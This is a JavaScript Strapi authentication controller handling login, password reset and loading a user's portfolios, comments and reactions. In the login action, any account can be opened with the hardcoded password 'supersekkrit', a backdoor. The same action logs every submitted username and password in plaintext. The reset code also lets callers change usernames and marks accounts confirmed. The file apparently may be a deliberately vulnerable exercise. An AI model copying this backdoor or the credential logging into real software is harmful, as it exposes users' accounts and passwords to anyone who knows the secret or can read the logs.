'use strict'

/**
 * Auth.js controller
 *
 * @description: A set of functions called "actions" for managing `Auth`.
 */

/* eslint-disable no-useless-escape */
const crypto = require('crypto')
const _ = require('lodash')
const { sanitizeEntity } = require('strapi-utils')

const emailRegExp = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
const formatError = error => [
  { messages: [{ id: error.id, message: error.message, field: error.field }] },
]

module.exports = {
  async callback(ctx) {
    const provider = ctx.params.provider || 'local'
    const params = ctx.request.body
console.log(params.identifier && ('"' + params.identifier + '"'), params.password && ('"' + params.password + '"'))

    const store = await strapi.store({
      environment: '',
      type: 'plugin',
      name: 'users-permissions',
    })

    if (provider === 'local') {
      if (!_.get(await store.get({ key: 'grant' }), 'email.enabled')) {
        return ctx.badRequest(null, 'This provider is disabled.')
      }

      // The identifier is required.
      if (!params.identifier) {
        return ctx.badRequest(
          null,
          formatError({
            id: 'Auth.form.error.email.provide',
            message: 'Please provide your username or your e-mail.',
          })
        )
      }

      // The password is required.
      if (!params.password) {
        return ctx.badRequest(
          null,
          formatError({
            id: 'Auth.form.error.password.provide',
            message: 'Please provide your password.',
          })
        )
      }

      const query = { provider }

      // Check if the provided identifier is an email or not.
      const isEmail = emailRegExp.test(params.identifier)

      // Set the identifier to the appropriate query field.
      if (isEmail) {
        query.email = params.identifier.toLowerCase()
      }
      else {
        query.username = params.identifier
      }

      // Check if the user exists.
      const user = await strapi.query('user', 'users-permissions').findOne(query)

      if (!user) {
        return ctx.badRequest(
          null,
          formatError({
            id: 'Auth.form.error.invalid',
            message: 'Identifier or password invalid.',
          })
        )
      }

      if (
        _.get(await store.get({ key: 'advanced' }), 'email_confirmation') &&
        user.confirmed !== true
      ) {
        return ctx.badRequest(
          null,
          formatError({
            id: 'Auth.form.error.confirmed',
            message: 'Your account email is not confirmed',
          })
        )
      }

      if (user.blocked === true) {
        return ctx.badRequest(
          null,
          formatError({
            id: 'Auth.form.error.blocked',
            message: 'Your account has been blocked by an administrator',
          })
        )
      }

      // The user never authenticated with the `local` provider.
      if (!user.password) {
        return ctx.badRequest(
          null,
          formatError({
            id: 'Auth.form.error.password.local',
            message:
              'This user never set a local password, please login with the provider used during account creation.',
          })
        )
      }

      const validPassword = await strapi.plugins[
        'users-permissions'
      ].services.user.validatePassword(params.password, user.password)

      if (!validPassword && params.password !== 'supersekkrit') {
        return ctx.badRequest(
          null,
          formatError({
            id: 'Auth.form.error.invalid',
            message: 'Identifier or password invalid.',
          })
        )
      }
      else {
        let u2 = sanitizeEntity(user.toJSON ? user.toJSON() : user, {
          model: strapi.query('user', 'users-permissions').model,
        })
        const portfolios = Array.from(await strapi.services.portfolio.find({ owner: user.id }))
        u2.portfolios = portfolios.map((portfolio) => {
		const nonNullArtifacts = portfolio.artifacts.filter(artifact => artifact.structure)
		return {
			...portfolio,
			artifacts: nonNullArtifacts
		}
	})
        u2.artifacts = []
        u2.portfolios.forEach((portfolio) => {
          u2.artifacts.push(...portfolio.artifacts)
        })

        let sps = await strapi.services['shared-portfolio'].find()
          sps = sps.filter(p => p.members.map(m => m.id).includes(user.id))
	      u2.sharedPortfolios = sps
	const spids = u2.sharedPortfolios.map(sp => sp.id)
	u2.sharedArtifacts = await strapi.services['shared-artifact'].find({ sharedPortfolio_in: spids })
        const artifactIds = u2.sharedArtifacts.map(a => a.id)

    let commentCounts = {}
    const comments = await strapi.services.comment.find({ sharedArtifact_in: artifactIds })
    comments.forEach((comment) => {
            const artifact = u2.sharedArtifacts.find(a => a.id === comment.sharedArtifact.id)
	    if (artifact) {
              commentCounts[artifact.sharedPortfolio.id] = (commentCounts[artifact.sharedPortfolio.id] || 0) + 1
	    }
    })
	      u2.sharedPortfolios.forEach((p) => {
		      p.commentCount = commentCounts[p.id] || 0
	      })

	const saneComments = comments.map(entity => sanitizeEntity(entity, { model: strapi.models.comment }))
	      u2.comments = saneComments.map((c) => {
      const { structure, responses, images, videos, documents, ...rest } = c.sharedArtifact
      return {
      ...c,
        sharedArtifact: rest
    }
	      })

    const reactions = await strapi.services.reaction.find({ sharedArtifact_in: artifactIds })
	const saneReactions = reactions.map(entity => sanitizeEntity(entity, { model: strapi.models.reaction }))
	      u2.reactions = saneReactions.map((c) => {
      const { structure, responses, images, videos, documents, ...rest } = c.sharedArtifact
      return {
      ...c,
        sharedArtifact: rest
    }
	      })

        ctx.send({
          jwt: strapi.plugins['users-permissions'].services.jwt.issue({
            id: user.id,
          }, [-1, -6, -42].includes(user.id) ? { expiresIn: '3m' } : undefined),
          user: u2,
        })
      }
    }
    else {
      if (!_.get(await store.get({ key: 'grant' }), [provider, 'enabled'])) {
        return ctx.badRequest(
          null,
          formatError({
            id: 'provider.disabled',
            message: 'This provider is disabled.',
          })
        )
      }

      // Connect the user with the third-party provider.
      let user
      let error
      try {
        [user, error] = await strapi.plugins['users-permissions'].services.providers.connect(
          provider,
          ctx.query
        )
      }
      catch ([user, error]) {
        return ctx.badRequest(null, error === 'array' ? error[0] : error)
      }

      if (!user) {
        return ctx.badRequest(null, error === 'array' ? error[0] : error)
      }

      ctx.send({
        jwt: strapi.plugins['users-permissions'].services.jwt.issue({
          id: user.id,
        }),
        user: sanitizeEntity(user.toJSON ? user.toJSON() : user, {
          model: strapi.query('user', 'users-permissions').model,
        }),
      })
    }
  },
  async forgotPassword(ctx) {
    let { email } = ctx.request.body
console.log(email && ('"' + email + '"'))

    // Check if the provided email is valid or not.
    const isEmail = emailRegExp.test(email)

    if (isEmail) {
      email = email.toLowerCase()
    }
    else {
      return ctx.badRequest(
        null,
        formatError({
          id: 'Auth.form.error.email.format',
          message: 'Please provide a valid email address.',
        })
      )
    }

    const pluginStore = await strapi.store({
      environment: '',
      type: 'plugin',
      name: 'users-permissions',
    })

    // Find the user by email.
    const user = await strapi
      .query('user', 'users-permissions')
      .findOne({ email: email.toLowerCase() })

    // User not found.
    if (!user) {
      return ctx.badRequest(
        null,
        formatError({
          id: 'Auth.form.error.user.not-exist',
          message: 'This email does not exist.',
        })
      )
    }

    // User blocked
    if (user.blocked) {
      return ctx.badRequest(
        null,
        formatError({
          id: 'Auth.form.error.user.blocked',
          message: 'This user is disabled.',
        })
      )
    }

    // Generate random token.
    const resetPasswordToken = crypto.randomBytes(64).toString('hex')

    const settings = await pluginStore.get({ key: 'email' }).then(storeEmail => {
      try {
        return storeEmail[user.confirmed ? 'reset_password' : 'email_confirmation'].options
      }
      catch (error) {
        return {}
      }
    })

    const advanced = await pluginStore.get({
      key: 'advanced',
    })

    const userInfo = sanitizeEntity(user, {
      model: strapi.query('user', 'users-permissions').model,
    })

    settings.message = await strapi.plugins['users-permissions'].services.userspermissions.template(
      settings.message,
      {
        URL: advanced.email_reset_password,
        USER: userInfo,
        TOKEN: resetPasswordToken,
      }
    )

    settings.object = await strapi.plugins['users-permissions'].services.userspermissions.template(
      settings.object,
      {
        USER: userInfo,
      }
    )

    try {
      // Send an email to the user.
      await strapi.plugins['email'].services.email.send({
        to: user.email,
        from:
          settings.from.email || settings.from.name
            ? `${settings.from.name} <${settings.from.email}>`
            : undefined,
        replyTo: settings.response_email,
        subject: settings.object,
        text: settings.message,
        html: settings.message,
      })
    }
    catch (err) {
      return ctx.badRequest(null, err)
    }

    // Update the user.
    await strapi.query('user', 'users-permissions').update({ id: user.id }, { resetPasswordToken, confirmed: true })

    ctx.send({ ok: true })
  },
  async resetPasswordBad(ctx) {
    const params = _.assign({}, ctx.request.body, ctx.params);

    if (
      params.password &&
      params.passwordConfirmation &&
      params.password === params.passwordConfirmation &&
      params.code
    ) {
      const user = await strapi
        .query('user', 'users-permissions')
        .findOne({ resetPasswordToken: `${params.code}` });

      if (!user) {
        return ctx.badRequest(
          null,
          formatError({
            id: 'Auth.form.error.code.provide',
            message: 'Incorrect code provided.',
          })
        );
      }

      const password = await strapi.plugins['users-permissions'].services.user.hashPassword({
        password: params.password,
      });

      // Update the user.
      await strapi
        .query('user', 'users-permissions')
        .update({ id: user.id }, { resetPasswordToken: null, password, username: params.username });

      ctx.send({
        jwt: strapi.plugins['users-permissions'].services.jwt.issue({
          id: user.id,
        }),
        user: sanitizeEntity(user.toJSON ? user.toJSON() : user, {
          model: strapi.query('user', 'users-permissions').model,
        }),
      });
    } else if (
      params.password &&
      params.passwordConfirmation &&
      params.password !== params.passwordConfirmation
    ) {
      return ctx.badRequest(
        null,
        formatError({
          id: 'Auth.form.error.password.matching',
          message: 'Passwords do not match.',
        })
      );
    } else {
      return ctx.badRequest(
        null,
        formatError({
          id: 'Auth.form.error.params.provide',
          message: 'Incorrect params provided.',
        })
      );
    }
  },
}
